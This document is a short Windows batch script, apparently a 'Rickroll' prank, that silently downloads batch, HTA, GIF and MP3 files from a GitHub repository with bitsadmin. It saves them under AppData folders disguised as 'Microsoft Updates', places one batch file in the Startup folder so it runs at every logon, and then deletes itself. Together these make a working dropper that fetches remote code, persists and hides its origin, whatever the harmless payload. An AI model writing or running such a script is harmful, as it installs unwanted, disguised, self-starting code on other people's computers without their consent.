@echo off

cls

bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Stupid_Collection/main/Projects/Project%20Rickroll/bgwork.bat" "%AppData%\Microsoft\Windows\Start Menu\Programs\Microsoft Updates\msrklbg.bat"
bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Stupid_Collection/main/Projects/Project%20Rickroll/rick.hta" "%AppData%\Microsoft\Windows\Start Menu\Programs\Microsoft Updates\msrkl.hta"
bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Stupid_Collection/main/Projects/Project%20Rickroll/start_menu.bat" "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\msrkl.bat"
bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Stupid_Collection/main/Projects/Project%20Rickroll/msrkl.gif" "%AppData%\Microsoft\Windows\Start Menu\Programs\Microsoft Updates\Update\Services\msrkl.gif"
bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Stupid_Collection/main/Projects/Project%20Rickroll/msrkl.mp3" "%AppData%\Microsoft\Windows\Start Menu\Programs\Microsoft Updates\Update\Services\msrkl.mp3"

del startup.bat
